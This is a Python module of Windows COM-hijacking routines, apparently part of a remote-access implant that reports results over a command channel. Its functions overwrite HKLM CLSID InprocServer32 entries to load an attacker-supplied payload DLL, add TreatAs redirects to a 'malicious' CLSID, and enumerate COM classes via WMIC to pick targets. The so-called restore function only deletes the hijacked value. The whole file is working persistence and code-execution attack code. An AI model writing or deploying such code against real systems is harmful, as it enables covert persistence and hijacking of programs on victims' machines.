import os
import subprocess

_BASE = r'SOFTWARE\Classes\CLSID'
_TREATAS = 'TreatAs'


def _w():
    import winreg
    return winreg


def hijack_com_class(protocol, clsid, payload_path):
    if os.name != 'nt':
        protocol.send('[-] COM hijacking is Windows-only')
        return
    w = _w()
    key_path = f'{_BASE}\\{{{clsid.strip("{}")}}}\\InprocServer32'
    try:
        key = w.CreateKey(w.HKEY_LOCAL_MACHINE, key_path)
        w.SetValueEx(key, '', 0, w.REG_SZ, payload_path)
        w.SetValueEx(key, 'ThreadingModel', 0, w.REG_SZ, 'Apartment')
        w.CloseKey(key)
        protocol.send(f'[+] COM hijack: {clsid} -> {payload_path}')
    except Exception as e:
        protocol.send(f'[-] COM hijack error: {str(e)}')


def hijack_com_treatas(protocol, original_clsid, malicious_clsid):
    if os.name != 'nt':
        protocol.send('[-] COM hijacking is Windows-only')
        return
    w = _w()
    key_path = f'{_BASE}\\{{{original_clsid.strip("{}")}}}'
    try:
        key = w.CreateKey(w.HKEY_LOCAL_MACHINE, key_path)
        t = w.CreateKey(key, _TREATAS)
        w.SetValueEx(t, '', 0, w.REG_SZ, f'{{{malicious_clsid.strip("{}")}}}')
        w.CloseKey(t)
        w.CloseKey(key)
        protocol.send(f'[+] TreatAs hijack: {original_clsid} -> {malicious_clsid}')
    except Exception as e:
        protocol.send(f'[-] TreatAs hijack error: {str(e)}')


def list_hijackable_com(protocol):
    if os.name != 'nt':
        protocol.send('[-] COM enumeration is Windows-only')
        return
    try:
        result = subprocess.run(
            'wmic path Win32_COMClass get Caption,CLSID /format:csv',
            shell=True, capture_output=True, text=True, timeout=15
        )
        candidates = []
        for line in result.stdout.split('\n'):
            if line.strip() and 'Caption' not in line:
                parts = line.split(',')
                if len(parts) >= 2 and parts[-1].strip():
                    candidates.append(f'  {parts[-1].strip()} : {parts[-2].strip() if len(parts) > 2 else "?"}')
        if candidates:
            protocol.send(f'[+] {len(candidates)} COM classes:\n' + '\n'.join(candidates[:50]))
        else:
            protocol.send('[-] No COM classes found via WMIC')
    except Exception as e:
        protocol.send(f'[-] COM enumeration error: {str(e)}')


def restore_com(protocol, clsid):
    if os.name != 'nt':
        protocol.send('[-] COM restoration is Windows-only')
        return
    w = _w()
    key_path = f'{_BASE}\\{{{clsid.strip("{}")}}}\\InprocServer32'
    try:
        key = w.OpenKey(w.HKEY_LOCAL_MACHINE, key_path, 0, w.KEY_READ)
        backup = os.path.join(os.environ.get('TEMP', '.'), f'com_bak_{clsid[:8]}.reg')
        subprocess.run(
            f'reg export "HKLM\\{key_path}" "{backup}" /y',
            shell=True, capture_output=True, timeout=10
        )
        w.CloseKey(key)
        key = w.OpenKey(w.HKEY_LOCAL_MACHINE, key_path, 0, w.KEY_SET_VALUE)
        w.DeleteValue(key, '')
        w.CloseKey(key)
        protocol.send(f'[+] COM restored: {clsid} (backup: {backup})')
    except Exception as e:
        protocol.send(f'[-] COM restore error: {str(e)}')
